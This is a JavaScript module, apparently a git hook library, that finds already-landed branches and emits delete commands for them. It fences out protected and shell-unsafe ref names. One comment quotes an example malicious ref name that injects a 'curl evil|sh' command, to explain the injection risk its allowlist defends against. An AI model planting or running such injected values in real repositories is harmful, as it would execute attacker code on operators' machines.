"use strict";
/**
 * reap-on-landing.js — classify local branches that became REAPABLE the moment
 * a PR landed, so `wip-discipline.md` MUST-4 ("Done means LANDED AND CLEANED —
 * And CLEANED Includes The REMOTE Ref") has an enforcement surface instead of
 * only a prose obligation.
 *
 * THE GAP, measured on this repo 2026-09-09. MUST-4 has been in force for
 * weeks. `git ls-remote --heads origin` returned 89 refs; `remote-ref-reap.mjs
 * --json` classified 88 of them (the base is protected) as 67 UNLANDED,
 * 18 LANDED-CONTENT, 3 CONTENT-UNMEASURED. Eighteen refs were reapable at that
 * moment and standing. The tool to reap them has existed and was hardened in
 * #2121; what was missing is anything that FIRES at the instant reaping becomes
 * free. `wrapup-after-landing.js` already proves the trigger works — it runs on
 * PostToolUse(Bash) on `gh pr merge` — but it speaks only about `.session-notes`
 * and says nothing about the branch that just became garbage.
 *
 * ── THE SAFETY ARGUMENT, AND WHY `git branch -d` IS NOT IT ──────────────────
 *
 * The obvious design is "run `git branch -d`; it refuses anything unmerged, so
 * it cannot destroy work." MEASURED ON THIS REPO, THAT CLAIM IS FALSE, and the
 * measurement is why this module exists in the shape it does:
 *
 *     $ git branch -d feat/host-memory-instrumentation
 *     warning: deleting branch '...' that has been merged to
 *              'refs/remotes/origin/feat/host-memory-instrumentation',
 *              but not yet merged to HEAD
 *     Deleted branch feat/host-memory-instrumentation (was e5f17f04).
 *
 * `-d` is satisfied by a merge into the branch's UPSTREAM. A branch pushed to
 * its own remote ref and merged NOWHERE is therefore `-d`-deletable. If such a
 * branch's remote ref is then reaped as well, the only copy is gone. That is
 * the exact shape of the forest hazard this repo already carries a warning
 * about (`origin/@` / `origin/+main`, 166 novel blobs, reapable-looking).
 *
 * So reapability here is decided by CONTENT REACHING THE BASE — measured with
 * `git cherry <base> <branch>`, i.e. every commit's PATCH-ID is already present
 * at the base — never by a deletion primitive's own opinion, and never by name
 * (`conservation-gate.md` MUST-2: membership is decided by content identity,
 * never name identity). NOT `git branch --merged`, which is ANCESTRY and is
 * false-negative by construction under squash merges; see `isLandedByContent`
 * for the measurement that replaced it.
 *
 * ── RECORDED PROVENANCE COMES BEFORE CONTENT (landing-provenance) ───────────
 *
 * Patch-id is itself an after-the-fact comparison, and it misreports in BOTH
 * directions once landing rewrites commits: a conflict-resolved or reformatted
 * landing has a DIFFERENT patch-id, so a landed branch reads `+` and is never
 * reaped (and gets re-reviewed or re-landed); a plain cherry-pick of a branch's
 * commit makes a branch that was never landed read `-`. So the local half now
 * asks `landed-map.js::landedVerdict` FIRST — the `Landed-From` /
 * `Landed-Partial` trailers `land-lane.mjs` writes at landing time — and runs
 * the cherry ONLY when that verdict says `fallback:true` (history before the
 * recorded cutover, or a repository with no recording config: every consumer).
 * `decided:false, fallback:false` is UNMEASURED and never reapable. See
 * `measureLocalByProvenance`. The error direction is unchanged: a branch no
 * instrument could establish as landed is never proposed.
 *
 * ── DIRECTION OF ERROR ──────────────────────────────────────────────────────
 *
 * The base is the INTEGRATION TRUNK, resolved by the one shared resolver
 * (`hooks/lib/trunk-ref.js::resolveTrunk` — `origin/dev` where it exists, else
 * `origin/main`), and it is read LOCALLY, deliberately: this runs inside a
 * PostToolUse hook where a network fetch would add a second of latency to every
 * merge. A STALE local trunk makes fewer branches look landed, so the error
 * direction is UNDER-reporting — the guard stays quiet about something
 * reapable. It can never invent reapability for a branch whose content is not
 * already known-present at the base. Silence is cheap; a wrong reap is not.
 *
 * Silence is cheap ONLY when it is earned. A pass that ran out of budget, or
 * could not resolve its base, has NOT established "nothing reapable" — so
 * `coverageLines` below names every branch it did not measure, and the guard
 * speaks whenever that list is non-empty (`conservation-gate.md` MUST-4).
 *
 * PURE CORE, THIN COLLECTOR — the convention `orphan-forest.js` sets. Every
 * decision below is a pure function over CAPTURED git output, so the tests
 * never mutate refs, never touch a remote, and never depend on what branches
 * happen to exist on the machine running them.
 */

/**
 * Refs never proposed for reaping regardless of merge state.
 *
 * `dev` is the integration trunk (`hooks/lib/trunk-ref.js:120-125` resolves
 * `<remote>/dev` first). Once landedness is measured AGAINST the trunk, the
 * trunk branch itself is trivially "landed by content" — `git cherry origin/dev
 * dev` prints nothing — so without this entry the guard proposes deleting
 * `dev`, locally and on the remote. A trunk declared under another name via
 * `COC_TRUNK_REF` is fenced by the caller through `branchNameOfRef`.
 */
const NEVER_REAP = new Set(["main", "master", "dev", "HEAD"]);

/**
 * Namespaces whose whole POINT is to survive a reap. Measured on this repo
 * 2026-09-10: `preserve/s50-coord-predicate-983303d1` is LANDED-BY-CONTENT on
 * `origin/main` and has no local branch, so it sits squarely in the population
 * the remote arm below proposes — a ref named for its own preservation was one
 * `--apply` away from deletion because the default protection set was EMPTY.
 *
 * A PREFIX set, not a glob engine: these are namespace separators (`preserve/`),
 * so `startsWith` is the whole predicate and there is no pattern to get wrong.
 * Callers may add their own EXACT names on top via `extra`; none may subtract
 * from this. `extra` is array membership under `===` (see below) — it is NOT a
 * glob channel, and cannot express what `remote-ref-reap.mjs --protect` accepts
 * (that flag compiles a glob via its own `globMatch`). An earlier revision of
 * this line said "names/globs", which the function has never implemented; it is
 * corrected here because a reader would otherwise conclude `extra` can carry a
 * --protect set forward, and silently build a protection channel that matches
 * nothing.
 */
const PROTECTED_PREFIXES = ["preserve/", "backup/", "salvage/", "wip/"];

/**
 * PURE. Is this ref name safe to interpolate into a COMMAND that a report hands
 * an operator to run VERBATIM?
 *
 * ── WHY THIS EXISTS, AND WHY IT IS AN ALLOWLIST ────────────────────────────
 *
 * `reapCommands` emits `git push origin --delete <name>` and `git branch -d
 * <name>` as TEXT, and the guard presents that text under "the exact commands —
 * no human decision is required". It is therefore a command-construction site,
 * not a display site, and the operator (or an agent acting for them) pastes it
 * into a SHELL. The names reaching it are NOT locally authored: the remote arm's
 * population comes from `parseRemoteRefs` over `git for-each-ref
 * refs/remotes/origin`, i.e. from anyone with push access to the remote.
 *
 * `git check-ref-format` permits `;`, `|`, `&`, `$`, `(`, `)`, `{`, `}` and a
 * backtick in a branch name. A ref named `feat/x;curl evil|sh` is a VALID ref
 * that renders a valid-looking two-command line. So the threat is not exotic: it
 * is one `git push origin HEAD:refs/heads/<payload>` away.
 *
 * ALLOWLIST, NOT ESCAPING, and NOT a display sanitizer. Two shared helpers in
 * this repo neutralize names — `unlanded-work-surface.js::sanitizeName` and
 * `upflow-self-repo.js::sanitizeForReason` — and NEITHER is the right instrument
 * here. Both were built for the question "can this text forge structure in a
 * REPORT the agent reads?", so they strip control characters, backticks and bidi
 * marks and deliberately preserve everything else; `sanitizeForReason`'s own
 * header says "Display only, never an operand". Reading either as an answer to
 * "is this safe in a SHELL command?" is `instrument-discipline.md` MUST-4 — an
 * instrument sound for one question re-used for a second — and it fails: `;` and
 * `$(…)` survive both untouched. Quoting instead of refusing was also rejected:
 * it makes the emitted command's safety depend on the operator's shell and on
 * nobody ever re-splitting the string, and the SAFE direction here is to emit no
 * command at all (`remote-ref-reap.mjs` takes exactly this line for names
 * beginning with `-`: "refusing the class is cheaper than reasoning about which
 * of git's parsers are option-terminated").
 *
 * The class: an ASCII ref name of `[A-Za-z0-9._/-]`, first character alphanumeric
 * or `_`. A leading `-` would be read by git as an OPTION rather than a value; a
 * leading `.` is not a legal ref component anyway. Every branch name this repo
 * has ever carried passes. A legal-but-unusual name (unicode, `+`, `~`) is fenced
 * rather than emitted, which UNDER-reports — the same direction of error the
 * whole module is built around.
 */
const COMMAND_SAFE_REF = /^[A-Za-z0-9_][A-Za-z0-9._/-]*$/;
const REF_NAME_MAX = 255;
function isCommandSafeRefName(name) {
  if (typeof name !== "string" || name === "" || name.length > REF_NAME_MAX) return false;
  return COMMAND_SAFE_REF.test(name);
}

/**
 * PURE. A DISPLAY rendering for a name that failed `isCommandSafeRefName`, so
 * the refusal can NAME what it refused without carrying the payload forward.
 * Positive allowlist again, matching the predicate: every character outside the
 * safe class becomes `%XX`, so the result is inert in a report AND in a command
 * line, and is still recognisable enough for an operator to find the ref.
 */
function displayUnsafeRefName(name) {
  const s = String(name == null ? "" : name).slice(0, REF_NAME_MAX);
  if (s === "") return "(empty)";
  return s.replace(/[^A-Za-z0-9._/-]/g, (ch) =>
    [...ch]
      .map((c) =>
        [...new TextEncoder().encode(c)]
          .map((b) => "%" + b.toString(16).toUpperCase().padStart(2, "0"))
          .join(""),
      )
      .join(""),
  );
}

/**
 * PURE. Is this branch name protected from reaping? `extra` holds caller-supplied
 * EXACT names (the `protectedNames` argument). The prefix set above is the floor
 * and is never bypassable — a caller can widen protection, never narrow it.
 *
 * THE COMMAND-SAFETY FENCE IS DELIBERATELY *NOT* HERE, and the reason is
 * measured rather than stylistic. Folding `!isCommandSafeRefName` into this
 * predicate was the first cut and it SILENCED the very finding it was added to
 * surface: `wip-lanes.js::landedRemoteRefs` calls this function to sort refs into
 * `found` vs `protectedFound` BEFORE `classify` ever sees them ("DEMOTE, NEVER
 * SUPPRESS"), and the PostToolUse guard filters its local candidates through it
 * too — so a hostile name would be demoted upstream and `classify` could never
 * report it. It would also change `remote-ref-reap.mjs`, which imports this as
 * its protection FLOOR and would then file such a ref under "held by the floor",
 * a reason that is not true of it. That tool needs no such fence anyway: it
 * deletes through `spawnSync` with an ARGV ARRAY, which defeats the shell
 * outright, and it already refuses a leading `-` separately.
 *
 * So command-safety is enforced where the command is CONSTRUCTED — `classify`
 * (which drops the row AND names it) and `reapCommands` (defense in depth) —
 * and this predicate keeps meaning exactly what it has always meant: a name an
 * operator has deliberately placed out of reach.
 */
function isProtectedName(name, extra = []) {
  if (typeof name !== "string" || name === "") return true; // unnameable ⇒ never a candidate
  if (NEVER_REAP.has(name)) return true;
  if (extra.includes(name)) return true;
  return PROTECTED_PREFIXES.some((p) => name.startsWith(p));
}

/**
 * PURE. Parses `git branch --format=%(refname:short)` — the CANDIDATE set only.
 * Landedness is decided by `isLandedByContent`, never by this list.
 *
 * `git` marks the checked-out branch with a leading `*` under some formats;
 * that is stripped rather than trusted to be absent.
 */
function parseBranchList(text) {
  if (typeof text !== "string") return [];
  return text
    .split("\n")
    .map((l) => l.replace(/^\*?\s*/, "").trim())
    .filter((l) => l.length > 0 && !l.startsWith("("));
}

/**
 * PURE. Reads `git cherry <base> <branch>`. Each line is `+ <sha>` for a commit
 * whose PATCH-ID is absent from <base>, `- <sha>` for one already present.
 * Zero `+` lines ⇒ every commit's content is at the base ⇒ LANDED.
 *
 * ── WHY PATCH-ID AND NOT ANCESTRY — measured, and this replaced a wrong cut ──
 *
 * The first version of this module used `git branch --merged <base>`, which is
 * ANCESTRY: it lists a branch only when its TIP is an ancestor of the base.
 * That is wrong for this repo and was near-VACUOUS in practice, because loom
 * SQUASH-merges — a squash re-authors the branch's commits into one new commit
 * with a different sha, so a fully-landed branch is NOT an ancestor of main.
 *
 * MEASURED 2026-09-09 over the same 89 remote refs:
 *
 *     content-based (patch-id)   -> 18 LANDED
 *     ancestry-based (--merged)  ->  0 of those 18 visible
 *
 * and on one named branch, `chore/s87-final-wrapup`:
 *
 *     git merge-base --is-ancestor  -> NOT-ANCESTOR
 *     git cherry (patch-id)         -> 0 unlanded  ⇒ content IS on main
 *
 * The ancestry version PASSED its own live control — because that control used
 * a branch pointing LITERALLY AT origin/main, trivially an ancestor and a case
 * that never occurs after a real merge. A known-answer case that is not the
 * class the guard exists to catch is `instrument-discipline.md` MUST-3(a), and
 * it is why "the control fired" was not evidence the predicate was right.
 *
 * Same hazard a sibling ecosystem repo reported for COMPOSITION merges — "never `git branch --merged`,
 * it is false-negative by construction, because composition re-authors
 * commits". Squash re-authors for the same reason, so the lesson transfers even
 * though loom does not compose.
 *
 * Direction of error is PRESERVED: patch-id comparison means a branch whose
 * content was amended before landing still reports `+` lines and is NOT
 * proposed. Under-reporting remains the failure mode.
 */
function isLandedByContent(cherryText, { requireMeasured = false } = {}) {
  if (typeof cherryText !== "string") return false; // unmeasured is never landed
  const lines = cherryText
    .split("\n")
    .map((l) => l.trim())
    .filter(Boolean);
  // An unparseable line means the measurement is not trustworthy; refuse it
  // rather than treat the absence of a `+` as proof of landedness.
  if (lines.some((l) => !/^[+-]\s/.test(l))) return false;
  // `requireMeasured` is for callers who have ALREADY established the tip is NOT
  // an ancestor of the base. For them an EMPTY cherry is not "nothing ahead" —
  // it is NO PATCH-ID MEASURED (a merge-only span; an evil merge carries content
  // in neither parent), which `remote-ref-reap.mjs` classifies CONTENT-UNMEASURED
  // and refuses. Callers with no ancestry fact keep the default, where an empty
  // span genuinely means nothing is ahead. ONE predicate, two established
  // contexts — never two copies (`security.md` § Enforcement-Surface Parity).
  if (requireMeasured && lines.length === 0) return false;
  return lines.every((l) => l.startsWith("-"));
}

/**
 * PURE. Parses `git for-each-ref refs/remotes/<remote> --format=%(refname:short)`
 * into the set of branch names that still have a remote-tracking ref.
 *
 * `%(refname:short)` renders `refs/remotes/origin/HEAD` as the BARE STRING
 * `origin` — measured on this repo, and the reason a `grep -v 'origin/HEAD$'`
 * filter silently never matches and miscounts. Any entry without a `<remote>/`
 * prefix is therefore dropped explicitly rather than filtered by pattern.
 */
function parseRemoteRefs(text, remote = "origin") {
  const out = new Set();
  if (typeof text !== "string") return out;
  const prefix = remote + "/";
  for (const raw of text.split("\n")) {
    const line = raw.trim();
    if (!line.startsWith(prefix)) continue; // drops the bare `origin` HEAD row
    const name = line.slice(prefix.length);
    if (name && name !== "HEAD") out.add(name);
  }
  return out;
}

/**
 * PURE. The verdict. A branch is REAPABLE only when its content is already at
 * the base; `remote` records whether a remote ref also needs reaping, which is
 * the half MUST-4 names and the half `gh pr merge --delete-branch` may already
 * have done.
 *
 * `current` is excluded: proposing that the session delete the branch it is
 * standing on is a refusal the operator cannot action without first moving.
 */
function classify({
  merged = [],
  remoteRefs = new Set(),
  remoteOnly = [],
  current = null,
  protectedNames = [],
  // The TRUE number of branches/refs MEASURED. Omitted, the denominator is the
  // landed population (`merged` + `remoteOnly`), which is what every caller had
  // — and it printed "1 branch(es) of 1 examined" over a pass that measured
  // four. A collector that knows its denominator passes it.
  examined = null,
} = {}) {
  const reapable = [];
  const seen = new Set();
  // A name fenced for being UNCOMMANDABLE is recorded, not merely dropped. Every
  // other reason `isProtectedName` fences is a DELIBERATE hold an operator chose
  // (`preserve/`, the trunk, a caller's `extra`), and silence about those is the
  // intended behaviour. This one is different: the ref is landed, reapable, and
  // its only disqualification is that this guard cannot write a safe command for
  // it — so silence would leave a reapable ref standing forever with nothing
  // anywhere saying why (`conservation-gate.md` MUST-4: an empty outcome is
  // announced, never rendered in the grammar of a completed one).
  const unsafeNames = [];
  // The caller composes its own fence and passes it as `protectedNames` — the
  // remote's DECLARED default branch included (the guard reads it through
  // `parseDefaultBranch` and pushes it in). Deliberately NOT a second
  // `defaultBranch` option here: one fence channel, not two saying the same
  // thing (`security.md` § Enforcement-Surface Parity).
  const fence = protectedNames;
  // Returns TRUE when the row must be dropped, and records it in the same pass —
  // so "not proposed" and "named as refused" cannot drift apart.
  const refuseUnsafe = (b) => {
    if (isCommandSafeRefName(b)) return false;
    if (typeof b === "string" && b !== "") {
      const shown = displayUnsafeRefName(b);
      if (!unsafeNames.includes(shown)) unsafeNames.push(shown);
    }
    return true;
  };
  for (const b of merged) {
    if (refuseUnsafe(b)) continue;
    if (isProtectedName(b, fence)) continue;
    if (current && b === current) continue;
    reapable.push({ branch: b, local: true, remote: remoteRefs.has(b) });
    seen.add(b);
  }
  // ── THE REMOTE-ONLY ARM ────────────────────────────────────────────────────
  //
  // MEASURED on this repo 2026-09-10 and the reason this arm exists: of 88 refs
  // `git ls-remote --heads origin` reports, 21 are LANDED-BY-CONTENT, and ALL 21
  // have NO local branch. The local candidate set above therefore reported 0 of
  // 21 — right predicate, wrong population. A remote-only row carries
  // `local:false`, which `reapCommands` reads to omit the local delete.
  //
  // The caller owes the landedness: entries here are names ALREADY established
  // landed by `isLandedByContent`. This function decides membership and shape,
  // never landedness — the split `classify` has always had.
  for (const b of remoteOnly) {
    if (refuseUnsafe(b)) continue;
    if (isProtectedName(b, fence)) continue;
    if (current && b === current) continue;
    if (seen.has(b)) continue; // a name with a local branch belongs to the arm above
    reapable.push({ branch: b, local: false, remote: true });
    seen.add(b);
  }
  reapable.sort((a, b) => a.branch.localeCompare(b.branch));
  return {
    reapable,
    unsafeNames,
    counts: {
      // Refs fenced for being uncommandable. SEPARATE from `reapable`: they are
      // not proposed, and they are not silently gone either.
      unsafe_name: unsafeNames.length,
      // the DENOMINATOR — "0 reapable" and "examined nothing" must not print
      // alike. It spans BOTH populations, so adding the remote arm cannot make
      // the ratio flatter than it is.
      examined:
        Number.isInteger(examined) && examined >= 0
          ? examined
          : merged.length + remoteOnly.length,
      reapable: reapable.length,
      with_remote: reapable.filter((r) => r.remote).length,
      remote_only: reapable.filter((r) => !r.local).length,
    },
  };
}

/**
 * PURE. The exact commands, in an order that cannot strand content: the REMOTE
 * ref is reaped only for a branch whose content is at the base, and the local
 * delete uses `-d`. `-d` is NOT relied on as the safety check (see the header);
 * it is used because, given the content test already passed, the weaker
 * primitive is strictly preferable to `-D` if the two ever disagree.
 */
function reapCommands(reapable) {
  const lines = [];
  for (const r of reapable) {
    // DEFENSE IN DEPTH, and deliberately not the only fence. `isProtectedName`
    // already keeps an uncommandable name out of every row `classify` builds, so
    // this is a no-op on that path. It is here because THIS is the function that
    // performs the interpolation, and a caller assembling rows by hand (a test,
    // a future collector, `remote-ref-reap.mjs` growing a reporting mode) would
    // otherwise reach the interpolation with the upstream fence bypassed. A
    // construction site that cannot be reached with an unsafe operand is worth
    // more than one that merely is not, today.
    if (!isCommandSafeRefName(r && r.branch)) continue;
    if (r.remote) lines.push(`git push origin --delete ${r.branch}`);
    // A `local:false` row has NO local branch: `git branch -d <name>` would exit
    // non-zero with "branch not found". Emitting it anyway is not a harmless
    // extra line — it is a block that ERRORS on the operator's first paste, and
    // an operator who learns the block's commands do not run stops reading the
    // block. The row already carries the fact; honour it.
    if (r.local !== false) lines.push(`git branch -d ${r.branch}`);
  }
  return lines;
}

/** PURE. The operator-facing summary; null when there is nothing to say. */
function summarize(result) {
  const { counts } = result;
  // The uncommandable-name fence speaks through THIS sentence because it is the
  // one the caller already renders, and because "nothing reapable" and "one ref
  // I refused to write a command for" must not read alike. It is appended, not
  // substituted: a pass can have both.
  const unsafe = counts.unsafe_name || 0;
  const unsafeTail = unsafe
    ? `${unsafe} ref(s) were NOT proposed because their names are not safe to put in a shell command` +
      (Array.isArray(result.unsafeNames) && result.unsafeNames.length
        ? ` (${result.unsafeNames.slice(0, COVERAGE_LIST_CAP).join(", ")}, shown percent-escaped)`
        : "") +
      " — reap each by hand with `git update-ref -d`, quoting the name yourself"
    : "";
  if (counts.reapable === 0) return unsafeTail || null;
  return (
    `${counts.reapable} branch(es) of ${counts.examined} examined are LANDED and reapable` +
    (counts.with_remote
      ? `, ${counts.with_remote} still holding a remote ref`
      : "") +
    (counts.remote_only
      ? ` (${counts.remote_only} remote-ONLY — no local branch to delete)`
      : "") +
    (unsafeTail ? `; ${unsafeTail}` : "")
  );
}

/**
 * PURE. The BRANCH NAME a base ref points at, so the caller can fence the trunk
 * branch itself out of the candidate set. `origin/dev` → `dev`,
 * `refs/remotes/upstream/release/2` → `release/2`, `refs/heads/trunk` → `trunk`.
 * A short remote-tracking form strips exactly ONE leading segment (the remote).
 * Over-fencing a local branch whose name happens to match is the safe error
 * direction here — it under-reports, it never proposes a deletion.
 */
function branchNameOfRef(ref) {
  if (typeof ref !== "string") return null;
  const r = ref.trim();
  if (r === "") return null;
  if (r.startsWith("refs/heads/")) return r.slice("refs/heads/".length) || null;
  const full = /^refs\/remotes\/[^/]+\/(.+)$/.exec(r);
  if (full) return full[1];
  const slash = r.indexOf("/");
  return slash > 0 && slash < r.length - 1 ? r.slice(slash + 1) : r;
}

/**
 * PURE. The branch `git symbolic-ref -q refs/remotes/<remote>/HEAD` names, or
 * null when the remote declares no default.
 *
 * WHY THIS IS A FENCE AND NOT A CURIOSITY. `NEVER_REAP` holds the names a trunk
 * is CONVENTIONALLY given — `main`, `master`, `dev` — and the caller additionally
 * fences the branch the resolved base names. Neither covers a repository whose
 * default branch is called something else: `origin/HEAD` → `release-2` is landed
 * against any trunk that contains it, sits in no protected prefix, and matches no
 * conventional name, so it is proposed for deletion both locally and on the
 * remote. `bin/remote-ref-reap.mjs` already refuses exactly this
 * (`branch === DEFAULT_BRANCH`, from the same `symbolic-ref` read); this is that
 * fence made available to the other consumer rather than written a third time
 * (`security.md` § Enforcement-Surface Parity).
 *
 * The git READ stays in the caller — every decision in this module is pure over
 * captured output, which is what lets the suite fence a `release-2` default with
 * no remote in existence.
 */
function parseDefaultBranch(symbolicRefOut, remote = "origin") {
  if (typeof symbolicRefOut !== "string") return null;
  const s = symbolicRefOut.trim();
  const prefix = `refs/remotes/${remote}/`;
  if (!s.startsWith(prefix)) return null;
  const name = s.slice(prefix.length);
  return name && name !== "HEAD" ? name : null;
}

/**
 * PURE. Parses `git worktree list --porcelain` into the branch names currently
 * CHECKED OUT in some worktree (including the main checkout). A lane branch cut
 * from the trunk a moment ago has no commits of its own, so it reads as landed
 * by content; proposing it is a false positive, and `git branch -d` refuses a
 * checked-out branch anyway. Detached worktrees carry no branch and add nothing.
 */
function parseWorktreeBranches(text) {
  if (typeof text !== "string") return [];
  const out = [];
  for (const raw of text.split("\n")) {
    const line = raw.trim();
    if (line.startsWith("branch refs/heads/")) {
      const name = line.slice("branch refs/heads/".length);
      if (name) out.push(name);
    }
  }
  return out;
}

/**
 * PURE over an injected `runCherry(branch, timeoutMs)` and clock. Measures each
 * candidate's landedness by CONTENT under a WALL-CLOCK budget.
 *
 * The loop this replaces had no budget and ran under a 5 s harness timeout, with
 * the hook's fallback timer already cleared — so a slow forest ended in a host
 * kill with NO output, which reads exactly like "nothing reapable". Here:
 *   - each spawn receives only the REMAINING budget (capped at `perCallCapMs`),
 *     so one pathological ref cannot sit past the budget;
 *   - a branch the budget did not reach is `unexamined`, NAMED, never dropped;
 *   - a branch whose cherry threw, timed out, or printed an unparseable line is
 *     `unmeasured` — UNKNOWN, never landed and never "not landed";
 *   - `complete` is true ONLY when neither list has an entry.
 */
function measureLocalByContent({
  candidates = [],
  runCherry,
  budgetMs,
  perCallCapMs = 2000,
  now = Date.now,
} = {}) {
  if (typeof runCherry !== "function") {
    throw new TypeError("measureLocalByContent: runCherry must be a function");
  }
  if (!Number.isFinite(budgetMs)) {
    throw new TypeError("measureLocalByContent: budgetMs must be a finite number of milliseconds");
  }
  const started = now();
  const out = {
    landed: [],
    examined: [],
    unexamined: [],
    unmeasured: [],
    budgetMs,
    candidates: candidates.length,
    complete: false,
  };
  for (const b of candidates) {
    const left = budgetMs - (now() - started);
    if (left <= 0) {
      out.unexamined.push(b);
      continue;
    }
    const state = cherryOne(b, left, runCherry, perCallCapMs);
    if (state === "unmeasured") {
      out.unmeasured.push(b);
      continue;
    }
    out.examined.push(b);
    if (state === "landed") out.landed.push(b);
  }
  out.complete = out.unexamined.length === 0 && out.unmeasured.length === 0;
  return out;
}

/**
 * ONE branch's content measurement — the body `measureLocalByContent` has always
 * run per candidate, lifted out so the provenance-first measurement below falls
 * back to EXACTLY the same instrument rather than to a second copy of it.
 * Returns "landed" | "not-landed" | "unmeasured".
 */
function cherryOne(b, left, runCherry, perCallCapMs) {
  let text = null;
  try {
    text = runCherry(b, Math.max(1, Math.min(left, perCallCapMs)));
  } catch {
    text = null;
  }
  const lines =
    typeof text === "string"
      ? text.split("\n").map((l) => l.trim()).filter(Boolean)
      : null;
  if (lines === null || lines.some((l) => !/^[+-]\s/.test(l))) {
    // NOT `examined`. A branch whose cherry threw, was SIGKILLed at its
    // timeout, or printed something unparseable was ATTEMPTED, never measured
    // — and `examined` is the DENOMINATOR the report divides by ("N of M
    // examined"). Counting an attempt there inflates M with branches whose
    // landedness is UNKNOWN, so the ratio claims coverage the pass does not
    // have, and the inflation is largest in exactly the degraded runs where
    // the denominator matters most. `unmeasured` already names them, so
    // nothing is lost by not counting them here — only the false credit is
    // (`conservation-gate.md` MUST-3: an instrument names what it could not
    // see, and does not fold it into what it could).
    return "unmeasured";
  }
  return isLandedByContent(text) ? "landed" : "not-landed";
}

/**
 * PURE over an injected `verdictFor(branch)`, `runCherry(branch, timeoutMs)` and
 * clock. The PROVENANCE-FIRST measurement: landedness read from the trailers the
 * lander RECORDED (`landed-map.js::landedVerdict`), with the content comparison
 * run ONLY where that verdict says it may be.
 *
 * WHY PROVENANCE COMES FIRST. `git cherry` answers "is the same PATCH on the
 * base?", which is not "was this branch landed?": a landing that resolved a
 * conflict or reformatted produces a DIFFERENT patch-id and reads `+` forever
 * (a landed branch that is never reaped, and gets re-reviewed or re-landed), and
 * a plain cherry-pick of one commit makes a branch that was never landed read
 * `-` (proposed for deletion on a coincidence). The trailer is the link written
 * at landing time, so it is the first instrument asked.
 *
 * `verdictFor(b)` returns `landedVerdict`'s shape (`landed-map.js::landedVerdict`,
 * its policy block and `::_verdictOf`), and each of its three outcomes has exactly
 * one disposition here:
 *   decided:true                  → examined; `landed` as recorded; NO cherry
 *   decided:false, fallback:true  → the legacy cherry (`cherryOne`), unchanged
 *                                   (status predates / ancestry — history the
 *                                   trailers cannot speak for — or no-config: the
 *                                   config file is ABSENT, recording was never
 *                                   enabled here; `landed-map.js::_mapFailureVerdict`)
 *   decided:false, fallback:false → UNMEASURED, named in `provenanceUnknown`;
 *                                   NEVER landed and never content-compared
 *                                   (status unknown, or no-map: the config EXISTS
 *                                   but the map could not be built —
 *                                   `landed-map.js::_mapFailureVerdict`)
 * A `verdictFor` that throws or returns a non-object is the third case.
 *
 * BULK FORM. `verdictsFor(candidates, budgetMs)` may be passed INSTEAD of
 * `verdictFor`: it is called ONCE, before the loop, on the same clock and with
 * the whole budget, and returns verdicts ALIGNED with `candidates` (the shape
 * `landed-map.js::landedVerdicts` returns). A decided verdict then costs the
 * loop nothing, so it is recorded even when the budget is spent — only the
 * cherry fallback is budget-gated. A missing entry is UNMEASURED. With a zero
 * budget the bulk call is not made and every candidate is `unexamined`.
 *
 * Same budget contract as `measureLocalByContent`: a branch the budget did not
 * reach is `unexamined`, never dropped, and the cherry receives only what is left.
 * `decidedBy` maps every EXAMINED branch to the instrument that decided it
 * ("provenance" | "content"), so the report can say which one spoke.
 */
function measureLocalByProvenance({
  candidates = [],
  verdictFor,
  verdictsFor,
  runCherry,
  budgetMs,
  perCallCapMs = 2000,
  now = Date.now,
} = {}) {
  if (typeof verdictFor !== "function" && typeof verdictsFor !== "function") {
    throw new TypeError("measureLocalByProvenance: verdictFor or verdictsFor must be a function");
  }
  if (typeof runCherry !== "function") {
    throw new TypeError("measureLocalByProvenance: runCherry must be a function");
  }
  if (!Number.isFinite(budgetMs)) {
    throw new TypeError("measureLocalByProvenance: budgetMs must be a finite number of milliseconds");
  }
  const started = now();
  const out = {
    landed: [],
    notLanded: [],
    examined: [],
    unexamined: [],
    unmeasured: [],
    provenanceUnknown: [],
    decidedBy: {},
    fallbackStatus: {},
    instruments: { provenance: 0, content: 0 },
    budgetMs,
    candidates: candidates.length,
    complete: false,
  };
  const bulk = typeof verdictsFor === "function";
  let pre = null;
  if (bulk && budgetMs > 0 && candidates.length > 0) {
    try {
      pre = verdictsFor(candidates.slice(), budgetMs);
    } catch (e) {
      pre = { threw: `verdicts threw: ${e && e.message}` };
    }
  }
  for (let i = 0; i < candidates.length; i++) {
    const b = candidates[i];
    let left = budgetMs - (now() - started);
    let v = null;
    if (bulk) {
      if (pre === null) {
        out.unexamined.push(b); // zero budget: the bulk call never ran
        continue;
      }
      v = Array.isArray(pre)
        ? pre[i]
        : { decided: false, fallback: false, status: "unknown", why: (pre && pre.threw) || "verdicts returned no list" };
    } else {
      if (left <= 0) {
        out.unexamined.push(b);
        continue;
      }
      try {
        v = verdictFor(b);
      } catch (e) {
        v = { decided: false, fallback: false, status: "unknown", why: `verdict threw: ${e && e.message}` };
      }
    }
    if (!v || typeof v !== "object") {
      v = { decided: false, fallback: false, status: "unknown", why: "no verdict was returned" };
    }
    if (v.decided === true) {
      out.examined.push(b);
      out.decidedBy[b] = "provenance";
      out.instruments.provenance++;
      if (v.landed === true) out.landed.push(b);
      else out.notLanded.push(b);
      continue;
    }
    if (v.decided === false && v.fallback === true) {
      left = budgetMs - (now() - started);
      if (left <= 0) {
        out.unexamined.push(b);
        continue;
      }
      const state = cherryOne(b, left, runCherry, perCallCapMs);
      if (state === "unmeasured") {
        out.unmeasured.push(b);
        continue;
      }
      out.examined.push(b);
      out.decidedBy[b] = "content";
      out.fallbackStatus[b] = String(v.status || "fallback");
      out.instruments.content++;
      if (state === "landed") out.landed.push(b);
      else out.notLanded.push(b);
      continue;
    }
    // decided:false + fallback:false (or any shape outside the contract).
    out.unmeasured.push(b);
    out.provenanceUnknown.push({ branch: b, why: String(v.why || v.status || "unknown") });
  }
  out.complete = out.unexamined.length === 0 && out.unmeasured.length === 0;
  return out;
}

/**
 * PURE. Resolve the local budget from the optional `COC_REAP_BUDGET_MS` knob.
 * The knob only LOWERS the budget — never above `ceilingMs`, which is sized to
 * sit under the 5 s harness timeout. A malformed value is NOT silently ignored:
 * `problem` names it so the report can say which setting did not apply.
 */
function resolveLocalBudget(raw, ceilingMs) {
  if (raw === undefined || raw === null || String(raw).trim() === "") {
    return { budgetMs: ceilingMs, problem: null };
  }
  const s = String(raw).trim();
  if (!/^\d+$/.test(s)) {
    return {
      budgetMs: ceilingMs,
      problem: `COC_REAP_BUDGET_MS=${s} is not a non-negative integer of milliseconds — it did NOT apply; the ${ceilingMs}ms ceiling was used.`,
    };
  }
  return { budgetMs: Math.min(Number(s), ceilingMs), problem: null };
}

